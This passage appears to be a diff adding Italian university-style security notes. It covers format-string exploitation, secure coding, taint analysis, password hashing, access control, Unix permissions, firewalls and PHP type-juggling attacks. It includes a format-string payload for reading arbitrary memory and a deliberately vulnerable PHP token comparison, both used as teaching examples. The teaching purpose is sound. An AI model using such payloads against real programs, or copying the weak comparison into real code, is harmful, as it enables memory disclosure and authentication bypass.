+<h3 id="step-3">Step 3</h3>
+<p>Estrarre il contenuto della memoria:</p>
+<p>Rimpiazzando <code>%7$16lx.</code> con <code>%7$s....</code>  possiamo stampare il contenuto all’indirizzo di memoria iniettato come stringa.</p>
+<p>Nota: i <code>....</code> servono per mantenere la lunghezza di 8 byte</p>
+<p>Quindi con la seguente stringa in input otteniamo il contenuto di un indirizzo di memoria arbitrario</p>
+<p><code>%7$s....\xf0\x90\x6b\x00\x00\x00\x00\x00</code></p>
+<h2 id="prevenzione-agli-attacchi">Prevenzione agli attacchi</h2>
+<p>i compilatori moderni lanciano degli warning quando <code>printf</code> viene invocato senza argomenti di formato, nonostante ciò ci sono casi in cui non vengono lanciati warning ad esempio facendo <code>printf(f, s)</code>, se l’attaccante controllasse <code>f</code> riuscirebbe a fare l’attacco.</p>
+<p>È quindi importante che la <em>format string</em> sia sempre una costante definita dal programmatore e non dovrebbe essere influenzata dall’input dell’utente.</p>
+<h1 id="secure-coding">Secure coding</h1>
+<p>Linguaggi di programmazione come C sono ritenuti <em><strong>unsafe</strong></em> e richiedono che ci sia una grossa attenzione da parte degli sviluppatori per scrivere codice sicuro. Nonostante questo, tutti i linguaggi presentano comportamenti insicuri.</p>
+<h2 id="analisi">Analisi</h2>
+<p>Sebbene l’ispezione manuale del codice sia possibile per programmi di piccole dimensioni, gli <strong>strumenti di analisi statica</strong> sono necessari per applicazioni del mondo reale. Tuttavia, le proprietà che dipendono dal flusso di controllo sono generalmente indecidibili, quindi gli strumenti di analisi statica non possono essere precisi al 100%.</p>
+<p>Durante una analisi si possono presentare:</p>
+<ul>
+<li><strong>falsi negativi</strong>: non vengono segnalati errori effettivamente presenti nel codice.</li>
+<li><strong>falsi positivi</strong>: vengono segnalati errori che in realtà non esistono.</li>
+</ul>
+<p>Generalmente si desidera un’analisi <strong>sana</strong> (nessun falso negativo) e <strong>completa</strong> (nessun falso positivo), ma nella pratica gli strumenti danno più priorità ad essere <strong>sani</strong> cercando di minimizzare i falsi positivi.</p>
+<h2 id="taint-analysis">Taint analysis</h2>
+<p>Un concetto chiave nella sicurezza del codice è <strong>l’analisi della contaminazione (<em>taint analysis</em>)</strong>, che determina quali valori provenienti dagli input del programma possono influenzare i valori utilizzati in un’operazione rischiosa.</p>
+<ul>
+<li><strong>La sorgente contaminata</strong> (<em>Tainted Source</em>): Si riferisce a qualsiasi fonte di dati esterni al programma che potrebbe essere controllata da un utente malintenzionato.</li>
+<li><strong>Il valore contaminato</strong> (<em>Tainted Value</em>): Un valore è considerato contaminato se deriva da una sorgente contaminata e non è stato opportunamente sanificato.</li>
+<li><strong><em>Restricted Sink</em>:</strong> Si riferisce a un argomento di una funzione che richiede un insieme specifico di valori accettabili. Utilizzare un valore contaminato in un restricted sink può portare a vulnerabilità di sicurezza.</li>
+</ul>
+<h3 id="propagazione">Propagazione</h3>
+<p>Una contaminazione si può propagare attraverso le operazioni del programma.</p>
+<p>Se un’operazione utilizza un dato contaminato, il risultato dell’operazione sarà a sua volta contaminato. Un banale esempio è copiare una stringa contaminata in un’altra stringa tramite funzioni come <code>strcpy</code>.</p>
+<p>Esempio di propagazione:</p>
+<p><img src="https://i.ibb.co/S3CwCyc/image.png" alt="https://i.ibb.co/S3CwCyc/image.png"></p>
+<h2 id="sanitizzazione">Sanitizzazione</h2>
+<p>La sanitizzazione è il processo per <strong>rimuovere la contaminazione</strong> da un valore.</p>
+<p>Esistono due approcci principali:</p>
+<ul>
+<li><strong>Sostituzione:</strong> I valori contaminati (fuori dal dominio del <em>sink</em>) vengono sostituiti con valori appartenenti al dominio <em>sink</em>.</li>
+<li><strong>Terminazione:</strong> Il programma rileva un valore contaminato e termina l’esecuzione o salta il codice che utilizza quel valore.</li>
+</ul>
+<h2 id="secure-coding-sei-cert">Secure Coding: SEI CERT</h2>
+<p>Il <a href="https://wiki.sei.cmu.edu/confluence/display/c/SEI+CERT+C+Coding+Standard">SEI CERT C Coding Standard</a> fornisce regole e raccomandazioni per la scrittura di codice C sicuro.</p>
+<p>Esso definisce:</p>
+<ul>
+<li><strong>Regole</strong>: Requisiti normativi la cui violazione indica un bug potenzialmente sfruttabile.</li>
+<li><strong>Raccomandazioni</strong>: Suggerimenti per migliorare sicurezza, affidabilità e robustezza del codice.</li>
+</ul>
+<h3 id="valutazione-del-rischio">Valutazione del Rischio</h3>
+<p>La valutazione del rischio aiuta a dare priorità alle correzioni delle violazioni delle regole e raccomandazioni.</p>
+<p>Si valuta la <strong>gravità</strong> delle conseguenze, la <strong>probabilità</strong> di sfruttamento e il <strong>costo</strong> della correzione. Le violazioni <strong>più critiche e meno costose</strong> hanno <strong>più priorità</strong>.</p>
+<p><strong>Livelli di gravità</strong>:</p>
+<ol>
+<li>Bassa: ad esempio Denial of Service, terminazione anomala.</li>
+<li>Media: ad esempio Violazione dell’integrità dei dati, divulgazione di informazioni.</li>
+<li>Alta: ad esempio esecuzione di codice arbitrario.</li>
+</ol>
+<p><strong>Livelli di probabilità</strong>:</p>
+<ol>
+<li>Improbabile</li>
+<li>Probabile</li>
+<li>Verosimile</li>
+</ol>
+<p><strong>Livelli di costo di correzione</strong>:</p>
+<ol>
+<li>Alto: Correzione manuale e rilevamento manuale.</li>
+<li>Medio: Correzione manuale e rilevamento automatico.</li>
+<li>Basso: Correzione automatica e rilevamento automatico.</li>
+</ol>
+<p>I valori di questi livelli vengono moltiplicati tra loro producendo i possibili valori di <strong>priorità</strong>:  <code>1, 2, 3, 4, 6, 8, 9, 12, 18, 27</code></p>
+
+<table>
+<thead>
+<tr>
+<th>Livello</th>
+<th>Priorità</th>
+<th>Interpretazione</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>L1</td>
+<td>12, 18, 27</td>
+<td>alta gravità, alta probabilità, basso costo di correzione</td>
+</tr>
+<tr>
+<td>L2</td>
+<td>6, 8, 9</td>
+<td>media gravità, probabilità media, costo medio</td>
+</tr>
+<tr>
+<td>L3</td>
+<td>1, 2, 3, 4</td>
+<td>bassa gravità, bassa probabilità, alto costo</td>
+</tr>
+</tbody>
+</table><h3 id="esempio-2">Esempio</h3>
+<p>Una <strong>regola</strong> che ci da <a href="https://wiki.sei.cmu.edu/confluence/display/c/SEI+CERT+C+Coding+Standard">SEI CERT C Coding Standard</a> è quella di <strong>non passare una sequenza di caratteri non terminata da NULL a una funzione di libreria che si aspetta una stringa.</strong></p>
+<pre class=" language-c"><code class="prism  language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	 <span class="token keyword">char</span> c_str<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"abc"</span><span class="token punctuation">;</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> c_str <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>Nel codice l’array <code>c_str</code> non ha abbastanza spazio per inserire il carattere di terminazione stringa.</p>
+<p>Per fixare questo problema possiamo seguire una <strong>raccomandazione</strong>: non specificare la grandezza dell’array di caratteri quando viene inizializzato con un letterale.</p>
+<pre class=" language-c"><code class="prism  language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	 <span class="token keyword">char</span> c_str<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"abc"</span><span class="token punctuation">;</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> c_str<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>In questo modo <code>c_str</code> si alloca in automatico lo spazio necessario per contenere il letterale e il carattere di terminazione.</p>
+<p>Un attaccante può sfruttare questa vulnerabilità per accedere alla memoria fuori dai limiti dell’array (buffer overflow), la community categorizza questa regola in questo modo</p>
+
+<table>
+<thead>
+<tr>
+<th>Gravità</th>
+<th>Probabilità</th>
+<th>costo di correzione</th>
+<th>Priorità</th>
+<th>Livello</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Alta</td>
+<td>Probabile</td>
+<td>medio</td>
+<td>12</td>
+<td>L1</td>
+</tr>
+</tbody>
+</table><h1 id="identificazione">Identificazione</h1>
+<p>Passiamo ora a discutere della sicurezza nell’<strong>identificazione di un utente</strong> in un sistema informatico o una rete.</p>
+<p>L’identificazione o autenticazione di un utente o in generale di una entità è un processo fondamentale per la regolazione dell’<strong>accesso ad una risorsa</strong>.</p>
+<p>Un tipico esempio è l’autenticazione tramite username e password, in cui il sistema chiede di fornire un username e una password, il sistema controllerà le credenziali fornite con quelle già in suo possesso per validare l’autenticazione.</p>
+<p>Un buono schema di autenticazione serve ad <strong>impedire</strong> che una entità si <strong>impersonifichi</strong> per qualcun’altra.</p>
+<h2 id="classi-di-schemi-di-identificazione">Classi di schemi di identificazione</h2>
+<p>Vediamo delle categorie che raggruppano gli schemi di identificazione, tali schemi si possono basare su:</p>
+<ul>
+<li>un segreto che si <strong>conosce</strong>: password, passphrase, PIN, chiavi crittografiche</li>
+<li>un oggetto che si <strong>possiede</strong>: Carta di credito, smartphone</li>
+<li>una <strong>caratteristica</strong> biometrica che si <strong>possiede</strong>: firma cartacea, impronta digitale, volto e voce, retina dell’occhio</li>
+</ul>
+<h2 id="password">Password</h2>
+<p>L’autenticazione tramite password presenta alcuni problemi:</p>
+<ol>
+<li>
+<p>Può essere <strong>intercettata</strong>.</p>
+<p>È importante usare canali cifrati, come <em>HTTPS</em></p>
+</li>
+<li>
+<p>Può essere <strong>indovinata.</strong></p>
+<p>È importante usare password forti.</p>
+<p>Inoltre il sistema deve implementare un meccanismo per limitare i tentativi possibili</p>
+</li>
+<li>
+<p>Può essere <strong>salvata</strong> nel server <strong>in modo non sicuro.</strong></p>
+<p>È importante che il server non memorizzi le password in chiaro, bensì un hash di esse.</p>
+</li>
+</ol>
+<h2 id="funzioni-hash">Funzioni hash</h2>
+<p>Una <strong>funzione di hash</strong> è una funzione che calcola un valore di lunghezza fissa, chiamato <em>digest</em>, dato un input di dimensioni arbitrarie. Sebbene le <strong>collisioni</strong> siano possibili (cioè che input diversi generano lo stesso hash), le funzioni di hash unidirezionali rendono <strong>computazionalmente impossibile recuperare una password dal suo hash</strong>.</p>
+<p>Quindi un server nel momento del login <strong>confronta gli hash</strong> e non le password in chiaro.</p>
+<p>Funzioni hash molto utilizzate oggi e ritenute essere sufficientemente sicure sono le SHA-2 che producono hash da 224 bit in su.</p>
+<p>Un comando per ottenere l’hash di una stringa di testo su Linux:</p>
+<pre class=" language-bash"><code class="prism  language-bash">$ <span class="token keyword">echo</span> -n <span class="token string">"mypassword"</span> <span class="token operator">|</span> sha256sum
+89e01536ac207279409d4de1e5253e01f4a1769e696db0d6062ca9b8f56767c8 -
+</code></pre>
+<p>Un altro utilizzo delle funzioni hash è per controllare <strong>l’integrità di file</strong>.</p>
+<p>Dai seguenti comandi si nota che la modifica del file viene rilevata confrontando gli hash dello stesso file prima e dopo la modifica:</p>
+<pre class=" language-bash"><code class="prism  language-bash">$ <span class="token keyword">echo</span> <span class="token string">"ciao"</span> <span class="token operator">&gt;</span> file.txt
+$ sha256sum file.txt <span class="token operator">&gt;</span> checksum
+
+$ sha256sum -c checksum
+file.txt: OK
+$ <span class="token keyword">echo</span> <span class="token string">"modifica"</span> <span class="token operator">&gt;</span> file.txt
+$ sha256sum -c checksum
+file.txt: FAILED
+sha256sum: WARNING: 1 computed checksum did NOT match
+</code></pre>
+<h2 id="attacchi-offline">Attacchi offline</h2>
+<p>Nonostante l’uso delle funzioni hash, usare password forti è comunque importante per proteggersi da <strong>attacchi brute force offline</strong> su cui non è possibile limitare il numero di tentativi.</p>
+<p>Inoltre è possibile usare un attacco a <strong>rainbow tables</strong>, che consiste nel avere una lista di associazioni di password comuni con il rispettivo hash già calcolato, se l’attaccante riuscisse ad ottenere l’hash di una password, con una semplice ricerca nella rainbow table otterrebbe la rispettiva password (se presente).</p>
+<h3 id="salting-delle-password">Salting delle password</h3>
+<p>Per contrastare quest’ultima tipologia di attacco, si utilizza il <strong>salting delle password</strong>, che consiste nell’aggiungere un valore casuale (il sale) a ciascuna password prima di calcolare l’hash.</p>
+<p><strong>Ogni salt è diverso</strong> per ciascun utente e viene salvato assieme all’hash nel server.</p>
+<p>Quindi il server mantiene la password hashata con il salt, e il salt utilizzato per quella password. L’utente quando si autentica manderà la propria password che verrà hashata con il salt rispettivo e verrà confrontato il risultato con l’hash che c’è sul server.</p>
+<p>In questo modo se l’attaccante ottiene solo l’hash della password dovrebbe indovinare il salt, ma dato che il salt è scritto assieme all’hash della password, se un attaccante ottiene anche il salt può usarlo per calcolare l’hash delle password comuni e vedere se il risultato combacia.</p>
+<p>Per migliorare ulteriormente la sicurezza si cerca di <strong>mantenere segreti i salt</strong>. Inoltre si cerca di fare <strong>computazioni dell’hash iterate più volte</strong> (anche migliaia di volte) per aumentare il tempo di computazione necessario e quindi rallentare attacchi di brute force.</p>
+<h2 id="token-based-authentication">Token-based authentication</h2>
+<p>Vediamo adesso l’autenticazione basata su <strong>un oggetto che si possiede.</strong></p>
+<p>Un esempio è una <strong>carta con una piccola memoria</strong> la suo interno (Carte bancomat a Banda Magnetica), La banda magnetica contiene dati statici codificati, come il numero del conto e altre informazioni di base. Spesso si accoppia l’oggetto ad un PIN, in modo che un attaccante abbia bisogno di entrambi. Il problema di queste carte è che sono facili da clonare con dei lettori, e magari l’uso di una telecamera per vedere il pin inserito dal proprietario.</p>
+<p>Le <strong>smart card</strong>, dotate di un chip integrato, offrono maggiore sicurezza rispetto alle tradizionali memory card passive. I chip generano un codice unico a ogni transazione, rendendo praticamente impossibile clonare la carta. Può fare anche operazioni crittografiche.</p>
+<h2 id="biometric-authentication">Biometric authentication</h2>
+<p>Infine, la <strong>biometria</strong> utilizza le caratteristiche biologiche uniche degli utenti per l’identificazione. Questo processo prevede la registrazione delle caratteristiche biometriche in un database e il successivo confronto con le caratteristiche acquisite durante la verifica.</p>
+<p>Sebbene la biometria offra un alto livello di sicurezza, solleva anche preoccupazioni relative alla privacy, poiché la compromissione di un database biometrico avrebbe un impatto significativo: sono dati unici e non cambiabili</p>
+<h1 id="controllo-degli-accessi">Controllo degli accessi</h1>
+<p>Con controllo degli accessi si intende una pratica di sicurezza per impedire l’accesso a delle risorse a chi non è autorizzato.</p>
+<p>Nell’ambito dei sistemi operativi, chi può accedere alle risorse solitamente è un <strong>utente</strong>, un <strong>programma</strong>, un <strong>processo</strong> o <strong>altri sistemi</strong>. L’accesso alle risorse del sistema viene regolato da una <em><strong>security policy.</strong></em></p>
+<p><img src="https://i.ibb.co/KsWbtFz/image.png" alt="https://i.ibb.co/KsWbtFz/image.png"></p>
+<h2 id="politiche-di-controllo-degli-accessi">Politiche di controllo degli accessi</h2>
+<p>Vediamo i diversi <strong>tipi di politiche di controllo degli accessi</strong>:</p>
+<ul>
+<li>
+<p><strong>Controllo di accesso discrezionale (DAC)</strong>: Il proprietario della risorsa determina chi può accedere alla risorsa in base alla <strong>identità</strong> dell’utente</p>
+<p>Un’entità <strong>può abilitare un’altra entità</strong> ad accedere a una risorsa.</p>
+</li>
+<li>
+<p><strong>controllo di accesso vincolato (MAC)</strong>: Il sistema determina l’accesso alla risorsa in base a delle <strong>etichette di classificazione</strong> date agli utenti e alle risorse, un utente per poter accedere alla risorsa deve possedere l’etichetta corretta</p>
+<p>Un’entità che ha l’autorizzazione ad accedere a una risorsa <strong>non può abilitare un’altra entità</strong> ad accedere a tale risorsa.</p>
+</li>
+<li>
+<p><strong>Controllo di accesso basato sui ruoli (RBAC)</strong>: basato sui <strong>ruoli</strong> che gli utenti hanno all’interno del sistema e ogni ruolo ha i propri permessi che stabiliscono quali accessi sono consentiti.</p>
+</li>
+<li>
+<p><strong>Controllo di accesso basato sugli attributi (ABAC)</strong>: basato sugli <strong>attributi</strong> dell’utente, sulla <strong>risorsa</strong> a cui si accede e sulle <strong>condizioni ambientali</strong> correnti. Gli attributi possono includere dati come l’età dell’utente, la posizione geografica, l’ora del giorno, o il tipo di dispositivo…</p>
+</li>
+</ul>
+<h2 id="oggetti-e-soggetti">Oggetti e soggetti</h2>
+<p>Vengono chiamati <strong>soggetti</strong> le entità capaci di accedere a delle risorse.</p>
+<p>Mentre vengono chiamati <strong>oggetti</strong> le risorse a cui accedere.</p>
+<p>I soggetti accedono agli oggetti attraverso dei <strong>processi</strong> che acquisiscono i permessi dell’utente.</p>
+<h2 id="diritti-di-accesso">Diritti di accesso</h2>
+<p>Un soggetto può avere vari diritti di accesso su un oggetto:</p>
+<ul>
+<li>Lettura (che include la copia)</li>
+<li>Scrittura (che include aggiungere, modificare o rimuovere del contenuto all’interno dell’oggetto)</li>
+<li>Esecuzione</li>
+<li>Eliminazione</li>
+<li>Creazione</li>
+</ul>
+<p>Una possibile organizzazione dei diritti di accesso che possiedono i soggetti nei confronti degli oggetti è attraverso una <strong>matrice degli accessi</strong>:</p>
+
+<table>
+<thead>
+<tr>
+<th>Soggetto/oggetto</th>
+<th>README.txt</th>
+<th>/etc/shadow</th>
+<th>Carol.pdf</th>
+<th>/bin/bash</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Alice</strong></td>
+<td>Lettura, Scrittura</td>
+<td>Lettura, Scrittura</td>
+<td></td>
+<td>Lettura, Scrittura, Esecuzione</td>
+</tr>
+<tr>
+<td><strong>Bob</strong></td>
+<td>Lettura</td>
+<td></td>
+<td>Lettura</td>
+<td>Lettura, Esecuzione</td>
+</tr>
+<tr>
+<td><strong>Carol</strong></td>
+<td>Lettura</td>
+<td></td>
+<td>Lettura, Scrittura</td>
+<td></td>
+</tr>
+</tbody>
+</table><p>La matrice degli accessi si può decomporre per ottenere:</p>
+<ul>
+<li><strong>Access Control List</strong> (ACL): per ogni oggetto si ottiene la lista degli utente con i rispettivi permessi (decomposizione in colonne)</li>
+<li><strong>Capabilities</strong>: per ogni soggetto si ottengono i suoi diritti su tutti gli oggetti (decomposizione in righe)</li>
+</ul>
+<h2 id="unix-access-control">Unix Access Control</h2>
+<p>Unix utilizza un controllo degli accessi di tipo DAC.</p>
+<p>Il kernel ha accesso libero a tutto il sistema, i programmi accedono a file e device attraverso il kernel.</p>
+<p>Ad <strong>ogni file e directory è assegnato uno</strong> <em><strong>user identifier</strong> (userid, uid)</em> che ne indica il proprietario e contribuisce a determinarne i permessi d’accesso.</p>
+<p>Ad <strong>ogni processo è associato un insieme di <em>user identifier</em></strong> che contribuiscono a determinare i permessi che il processo ha su file e directory.<br>
+L’utente root (con userid = 0) ha sempre accesso garantito dal kernel.</p>
+<h3 id="permessi-su-un-file">Permessi su un file</h3>
+<p>In Unix i permessi su un file sono formati da <strong>tre blocchi</strong> che definiscono i permessi del proprietario, del gruppo e di tutti gli altri.</p>
+<p>Ogni blocco può possedere i seguenti caratteri:</p>
+<ul>
+<li>
+<p><code>r</code>: permette la <strong>lettura</strong> del file o la visualizzazione del contenuto della directory.</p>
+</li>
+<li>
+<p><code>w</code>: permette la <strong>modifica</strong> del file o del contenuto della directory.</p>
+</li>
+<li>
+<p><code>x</code>: permette <strong>l’esecuzione</strong> del file o l’attraversamento della directory.</p>
+</li>
+<li>
+<p><code>s</code>: indica che il file è SUID (o SGID se la “s” è nella blocco del gruppo) e permette al file di essere eseguito con i privilegi del proprietario (o del gruppo) (viene messo al posto della <code>x</code>)</p>
+<p>Usare questa funzionalità è rischioso in quanto, se il file è vulnerabile un attaccante può ottenere i privilegi di root.</p>
+<p>Se proprio necessario è opportuno usare una pratica di <em>privilege drop</em>: cioè usare subito i privilegi del proprietario e poi scendere ai permessi standard dell’utente. Una volta scesi di permessi non sarà più possibile riacquisire i permessi del proprietario (ciò si può fare in C con la funzione <code>setuid()</code>)</p>
+</li>
+<li>
+<p><code>t</code>: il cosiddetto <em><strong>sticky bit</strong></em>, può apparire al posto della <code>x</code> nel terzo blocco in un file di tipo directory e indica che non è possibile eliminare file all’interno di tale directory di cui non si è proprietari. Questo è particolarmente utile in cartelle condivise come <code>/tmp</code></p>
+</li>
+</ul>
+<p>La seguente stringa di informazioni UNIX (ottenibili con il comando <code>ls -la</code>), mostra i permessi di una directory/file:</p>
+<pre class=" language-bash"><code class="prism  language-bash">-rwxr-xr-- 8 username groupname 678 Jan 10:10 filename 
+</code></pre>
+<p>la prima parte: <code>-rwxr-xr--</code> riguarda i permessi, in particolare:</p>
+<ul>
+<li>Il primo carattere riguarda il fatto che il file è una directory (’<code>d</code>’) oppure no (‘<code>-</code>’).</li>
+<li>Le successive <strong>prime tre posizioni</strong> indicano i permessi del <strong>proprietario</strong>. Nell’esempio il proprietario ha i permessi di lettura, scrittura ed esecuzione (<code>rwx</code>)</li>
+<li>Le <strong>seconde tre posizioni</strong> indicano i permessi per il <strong>gruppo</strong>. Nell’esempio i membri del gruppo possono leggere il file eseguirlo, ma non possono scriverci (<code>r-x</code>)</li>
+<li>Le <strong>ultime tre posizioni</strong> si riferiscono ai permessi per <strong>chiunque altro</strong>. Nell’esempio chiunque altro può solamente leggere il file (<code>r--</code>).</li>
+</ul>
+<h3 id="alterare-i-permessi">Alterare i permessi</h3>
+<p>È possibile alterare i permessi con il comando <code>chmod</code> ad esempio <code>chmod 760 myfile</code></p>
+<p>Il numero <code>760</code> viene interpretato come tre cifre distinte in base ottale</p>
+<ul>
+<li>7 = 111 = <code>rwx</code></li>
+<li>6 = 110 = <code>rw-</code></li>
+<li>0 = 000 = <code>---</code></li>
+</ul>
+<p>quindi il permesso totale sul file sarà composto come <code>rwxrw----</code></p>
+<h1 id="firewall">Firewall</h1>
+<p>In una rete possiamo avere una <strong>host-based defence</strong>, cioè una difesa realizzata sui singoli host, oppure una <strong>network-based defence</strong>, cioè un filtro implementato fuori dagli host che cerca l’intera rete.</p>
+<p>Uno strumento usato per quest’ultimo tipo di difesa è il <strong>Firewall</strong>.</p>
+<p>Si tratta di un componente hardware e/o software avente lo scopo di controllare gli accessi alle risorse di un sistema filtrando tutto il traffico che tale sistema scambia con l’esterno.</p>
+<p>Il sistema, che si suppone sicuro, può essere un singolo computer o una rete di computer mentre l’ambiente esterno con cui interagisce è tipicamente una rete che si suppone sconosciuta e insicura (solitamente Internet).</p>
+<p>Un firewall filtra il traffico sulla base di un insieme di <strong>regole</strong>, dette <em>policy.</em></p>
+<h2 id="firewall-nat">Firewall NAT</h2>
+<p>Una funzione spesso associata al firewall è quella di NAT (<em>Network Address Translation</em>), che può contribuire a rendere inaccessibili degli host sulla rete interna mascherandone gli indirizzi IP</p>
+<p>Le operazioni possibili che adotta il firewall in questo caso sono:</p>
+<ul>
+<li>
+<p><code>drop</code>: i pacchetti non vengono consegnati a causa di:</p>
+<ul>
+<li>indirizzo sorgente/destinazione</li>
+<li>porta sorgente/destinazione</li>
+<li>contenuto del pacchetto</li>
+</ul>
+</li>
+<li>
+<p><code>forward</code>: i pacchetti vengono consegnati da una sottorete ad un’altra, in base a</p>
+<ul>
+<li>indirizzo sorgente/destinazione</li>
+<li>porta sorgente/destinazione</li>
+<li>contenuto del pacchetto</li>
+</ul>
+</li>
+<li>
+<p><code>translate</code>: i pacchetti vengono consegnati ma gli indirizzi vengono tradotti.</p>
+<p>Questo è necessario in quanto nelle reti locali si utilizzano indirizzi privati mentre per navigare su internet si utilizzano indirizzi pubblici.</p>
+<p>Ci riferiamo a SNAT (Source NAT) per riferirci alla traduzione degli indirizzi per il traffico uscente dalla rete locale (che va verso internet)</p>
+<p><img src="https://i.ibb.co/5jVZrtK/image.png" alt="https://i.ibb.co/5jVZrtK/image.png"></p>
+<p>Ci riferiamo a DNAT (Destination NAT) per riferirci alla traduzione degli indirizzi per il traffico entrante in arrivo da internet (che va verso la rete locale)</p>
+<p><img src="https://i.ibb.co/6yTs2HF/image.png" alt="https://i.ibb.co/6yTs2HF/image.png"></p>
+</li>
+</ul>
+<p>Tipicamente è consigliato utilizzare un approccio di <strong>privilegio minimo</strong>: cioè droppare di default e far passare solamente ciò che è necessario.</p>
+<h2 id="netfilter">Netfilter</h2>
+<p><strong>Netfilter</strong> è un tool Linux che gestisce il filtraggio dei pacchetti di rete. Il suo scopo principale è implementare funzionalità come firewall, NAT, e il controllo del traffico di rete.</p>
+<p>Le regole di Netfilter sono implementate tramite strumenti come <strong>iptables.</strong></p>
+<p>Le regole sono implementate in <strong>catene (chains)</strong>, che definiscono il flusso del traffico di rete attraverso il sistema. Ogni pacchetto in transito viene processato attraverso una sequenza di catene e regole associate, che determinano cosa fare con il pacchetto (accettarlo, rifiutarlo, modificarlo, ecc…).</p>
+<p>Le principali <strong>catene</strong> predefinite di Netfilter sono:</p>
+<ol>
+<li><strong>INPUT</strong>: gestisce i pacchetti destinati al sistema (ricevuti da una rete remota o locale).</li>
+<li><strong>OUTPUT</strong>: gestisce i pacchetti in uscita dal sistema.</li>
+<li><strong>FORWARD</strong>: gestisce i pacchetti che passano attraverso il sistema senza essere destinati ad esso (ad esempio, nel caso di un router).</li>
+<li><strong>PREROUTING</strong>: applicato ai pacchetti appena ricevuti, prima che vengano instradati.</li>
+<li><strong>POSTROUTING</strong>: applicato ai pacchetti che stanno per essere inviati, dopo l’instradamento.</li>
+</ol>
+<p>Le <strong>regole</strong> vengono <strong>applicate in ordine sequenziale</strong> dentro ciascuna catena. Quando un pacchetto entra in una catena, Netfilter verifica se esistono regole che corrispondono al pacchetto stesso. Se una regola corrisponde, viene eseguita l’azione associata (ad esempio, accettare, rifiutare o modificare il pacchetto). Se nessuna regola corrisponde, viene eseguita l’azione di default (“DROP” o “ACCEPT”).</p>
+<h1 id="attacchi-web-server-side">Attacchi web server side</h1>
+<p>Le applicazioni web sono molto complesse e possono soffrire di una grande vastità di attacchi come:</p>
+<ul>
+<li>attacchi diretti al codice lato server</li>
+<li>attacchi ai database</li>
+<li>attacchi eseguiti nel browser dell’utente</li>
+<li>attacchi alla rete</li>
+</ul>
+<p>Data la natura di questi attacchi, è fondamentale adottare i principi di <em>secure coding</em> durante lo sviluppo di un’applicazione web. I principi cardine includono:</p>
+<ul>
+<li>un’attenta <strong>gestione dell’input</strong> utente per evitare manipolazioni del flusso di controllo</li>
+<li>l’adozione di pratiche di sicurezza in base ai linguaggi utilizzati</li>
+<li>evitare soluzioni ad hoc preferendo quelle standard.</li>
+</ul>
+<p>Vediamo quattro esempi di comuni vulnerabilità nel linguaggio PHP.</p>
+<h2 id="string-comparison-attacks">1 String comparison attacks</h2>
+<p>PHP, non richiede una definizione esplicita del tipo di variabile in quanto viene determinato dinamicamente in base al contesto tramite un meccanismo chiamato t<em>ype juggling</em> che esegue conversioni automatiche.</p>
+<p>Questo meccanismo, sebbene semplifichi la scrittura del codice, può introdurre comportamenti imprevedibili se si utilizza l’operatore di confronto debole <code>==</code>, dato che questo operatore esegue il confronto <strong>dopo</strong> la conversione automatica. Al contrario, l’operatore di confronto stretto <code>===</code> verifica l’uguaglianza sia del valore che del tipo senza la conversione automatica.</p>
+<p>Gli attacchi basati sul <strong>confronto di stringhe</strong> sfruttano queste comparazioni deboli per modificare il flusso di controllo dell’applicazione.</p>
+<p>Vediamo degli esempi di attacco nello specifico</p>
+<ul>
+<li>
+<p><strong>Bypass dell’autenticazione</strong>: Un token di sessione, tipicamente memorizzato in un cookie, viene confrontato lato server con un valore di riferimento per autenticare l’utente. Un attaccante può sfruttare il confronto debole per bypassare l’autenticazione fornendo un valore che, dopo la conversione, risulti uguale al token.</p>
+<pre class=" language-php"><code class="prism  language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	 <span class="token comment">// token stored on the server</span>
+	 <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">;</span>
+	 
+	 <span class="token comment">// User input, e.g. coming from a cookie</span>
+	 <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'user_token'</span><span class="token punctuation">]</span>
+	 
+	 <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$input</span> <span class="token operator">==</span> <span class="token variable">$token</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		 <span class="token comment">// access to privileged area</span>
+		 <span class="token keyword">echo</span> <span class="token string">"Authenticated!"</span><span class="token punctuation">;</span>
+	 <span class="token punctuation">}</span>
+	 <span class="token keyword">else</span> <span class="token punctuation">{</span>
+		 <span class="token comment">// login required ...</span>
+		 <span class="token keyword">echo</span> <span class="token string">"Please authenticate"</span><span class="token punctuation">;</span>
+	 <span class="token punctuation">}</span>
+<span class="token delimiter important">?&gt;</span></span>
+</code></pre>
